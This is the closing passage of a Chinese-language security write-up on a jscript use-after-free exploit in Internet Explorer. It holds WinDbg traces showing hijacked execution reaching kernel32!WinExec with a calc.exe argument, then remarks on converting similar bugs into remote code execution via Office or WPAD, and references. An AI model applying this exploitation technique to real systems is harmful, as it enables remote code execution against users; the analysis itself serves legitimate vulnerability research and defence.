       +0x100 Header           : [2] _M128A 
       +0x120 Legacy           : [8] _M128A 
       +0x1a0 Xmm0             : _M128A 
       +0x1b0 Xmm1             : _M128A 
       +0x1c0 Xmm2             : _M128A 
       +0x1d0 Xmm3             : _M128A 
       +0x1e0 Xmm4             : _M128A 
       +0x1f0 Xmm5             : _M128A 
       +0x200 Xmm6             : _M128A 
       +0x210 Xmm7             : _M128A 
       +0x220 Xmm8             : _M128A 
       +0x230 Xmm9             : _M128A 
       +0x240 Xmm10            : _M128A 
       +0x250 Xmm11            : _M128A 
       +0x260 Xmm12            : _M128A 
       +0x270 Xmm13            : _M128A 
       +0x280 Xmm14            : _M128A 
       +0x290 Xmm15            : _M128A 
       +0x300 VectorRegister   : [26] _M128A 
       +0x4a0 VectorControl    : 0x410041`00410041 
       +0x4a8 DebugControl     : 0x410041`00410041 
       +0x4b0 LastBranchToRip  : 0x410041`00410041 
       +0x4b8 LastBranchFromRip : 0x410041`00410041 
       +0x4c0 LastExceptionToRip : 0x410041`00410041 
       +0x4c8 LastExceptionFromRip : 0x410041`00410041 
    // eip 为 kernel32!WinExec 
    0:013> u 0x76c38d50 
    kernel32!WinExec: 
    00000000`76c38d50 488bc4          mov     rax,rsp 
    00000000`76c38d53 48895808        mov     qword ptr [rax+8],rbx 
    00000000`76c38d57 55              push    rbp 
    00000000`76c38d58 56              push    rsi 
    00000000`76c38d59 57              push    rdi 
    00000000`76c38d5a 4881ec10010000  sub     rsp,110h 
    00000000`76c38d61 0fbae21f        bt      edx,1Fh 
    00000000`76c38d65 8bf2            mov     esi,edx 
    // rcx 为 WinExec 的命令行参数 
    0:013> dc 0x39e9c4 
    00000000`0039e9c4  575c3a43 6f646e69 535c7377 65747379  C:\Windows\Syste 
    00000000`0039e9d4  5c32336d 636c6163 6578652e 00000000  m32\calc.exe.... 
    00000000`0039e9e4  00000069 00000002 00000069 000942a2  i.......i....B.. 
    00000000`0039e9f4  00000008 00790074 00650070 00000000  ....t.y.p.e..... 
    00000000`0039ea04  a9cc59f8 0000001a 0062006f 005f006a  .Y......o.b.j._. 
    00000000`0039ea14  00740070 005f0072 006f006c 00650077  p.t.r._.l.o.w.e. 
    00000000`0039ea24  00000072 a9d7dd8b 0000001a 0062006f  r...........o.b. 
    00000000`0039ea34  005f006a 00740070 005f0072 00700075  j._.p.t.r._.u.p. 
    // rsp 为 泄露的 native stack 地址 
    0:013> dps 0x53884e0 l50 
    00000000`053884e0  00000000`00001f80 
    00000000`053884e8  000007fe`fd1a24c8 msvcrt!control87+0x28 
    00000000`053884f0  00000000`05388580 
    00000000`053884f8  000007fe`f00d9315 jscript!TLS_NoDestructor::Close+0x59 
    00000000`05388500  00000000`00001fa0 
    00000000`05388508  00000000`00000451 
    00000000`05388510  00000000`0037aab8 
    00000000`05388518  00000000`00000409 
    00000000`05388520  00000000`00000451 
    00000000`05388528  000007fe`f00c4f44 jscript!IDispatchExInvokeEx2+0x1a5 
    00000000`05388530  00000000`056fbda0 
    00000000`05388538  00000000`00000000 
    00000000`05388540  00000000`056fbda0 
    00000000`05388548  00000000`00000451 
    00000000`05388550  00000000`05388678 
    00000000`05388558  00000000`00000000 
    00000000`05388560  00000000`05388690 
    00000000`05388568  00000000`0720e490 
    00000000`05388570  00000000`00000000 
    00000000`05388578  00000000`003ae071 
    00000000`05388580  00000000`00335310 
    00000000`05388588  00000000`00000000 
    00000000`05388590  00000000`00000000 
    00000000`05388598  00000000`00000000 
    00000000`053885a0  00000000`003797a0 
    00000000`053885a8  000007fe`f00c4e26 jscript!IDispatchExInvokeEx+0xbb 
    00000000`053885b0  00000000`00000451 
    00000000`053885b8  00000000`003797a0 
    00000000`053885c0  00000000`056fbda0 
    00000000`053885c8  00000000`00000000 
    00000000`053885d0  00000000`00370001 
    00000000`053885d8  00000000`05388678 
    00000000`053885e0  00000000`00000000 
    00000000`053885e8  00000000`05388690 
    00000000`053885f0  00000000`0720e490 
    00000000`053885f8  00000000`00000000 
    00000000`05388600  00000000`056fbda0 
    00000000`05388608  000007fe`f00c4cfd jscript!InvokeDispatchEx+0x19c 
    00000000`05388610  000007fe`ec1632e0 MSHTML!PlainRelease 
    00000000`05388618  000007fe`00000000 
    00000000`05388620  00000000`00000000 
    00000000`05388628  00000000`056fbda0 
    00000000`05388630  00000000`00000001 
    00000000`05388638  00000000`05388678 
    00000000`05388640  00000000`00000000 
    00000000`05388648  00000000`05388690 
    00000000`05388650  00000000`0720e490 
    00000000`05388658  00000000`00000000 
    00000000`05388660  00000000`00000001 
    00000000`05388668  00000000`0720e490 
    00000000`05388670  00000000`00000000 
    00000000`05388678  00000000`053886d0 
    00000000`05388680  00000000`00000000 
    00000000`05388688  00000000`00000001 
    00000000`05388690  00000000`00000000 
    00000000`05388698  00000000`00000000 
    00000000`053886a0  00000000`00000000 
    00000000`053886a8  00000000`00000000 
    00000000`053886b0  00000000`00000000 
    00000000`053886b8  00000000`00000000 
    00000000`053886c0  00000000`00000000 
    00000000`053886c8  00000000`00000000 
    00000000`053886d0  00000000`00000008 
    00000000`053886d8  00000000`0039f764 
    00000000`053886e0  00000000`003334f0 
    00000000`053886e8  006c0020`00290030 
    00000000`053886f0  000007fe`ec650000 MSHTML!CDiagnosticsGlobalScopeProxy::`vftable'+0x250 
    00000000`053886f8  00000000`0039f638 
    00000000`05388700  00000000`00001f80 
    00000000`05388708  00000000`003080b0 
    00000000`05388710  00000000`00000080 
    00000000`05388718  00000000`0037a480 
    00000000`05388720  00000000`00000000 
    00000000`05388728  00000000`053886f0 
    00000000`05388730  00000000`003797a0 
    00000000`05388738  00000000`05388e40 
    00000000`05388740  00000000`1039c228 
    00000000`05388748  000007fe`f00aabe8 jscript!NameList::FCreateVval+0xd8 
    00000000`05388750  00008687`1cf8f2fd 
    00000000`05388758  00000000`05389660
弹出计算器，实现代码执行~
0x09 写在最后  
这个漏洞到这里就分析完了，关于这个漏洞笔者有如下思考：  
•
这个漏洞的利用代码直接给出了将一个jscript的此类UAF漏洞转化为RCE的能力，换个角度思考，jscript模块中之前出现的那些类似的UAF漏洞，都可以通过这种方法实现RCE，而这些漏洞之前被人关注得并不多。  
•
纵观这个jscript漏洞的分析过程，由于此利用是国外安全研究员独立编写，所以与最初的在野0day利用代码并不一致，但是这份代码更具阅读性，并且在利用过程上和前几年被广泛讨论的vbscript漏洞异曲同工，都是借助错位来实现类型混淆。  
• 当jscript模型的UAF漏洞开始被逐渐发现(这类漏洞应该还有)，在jscript被加入office
Moniker的黑名单之前(vbscript被加入了黑名单)，攻击者应该会比较青睐这种通过office加载jscript漏洞的方式(或他们一直在用的wpad提权方式)，因为这种情况下无需配合提权漏洞，所以还请大家做好这两类攻击的防范工作。  
0x10 参考资料  
Garbage Collection Internals of JScript  
CVE-2018-8353漏洞分析笔记  
CVE-2017-11906 && CVE-2017-11907 组合漏洞分析笔记  
利用WPAD/PAC与JScript实现Windows 10远程代码执行  
aPAColypse now: Exploiting Windows 10 in a Local Network with WPAD/PAC and
JScript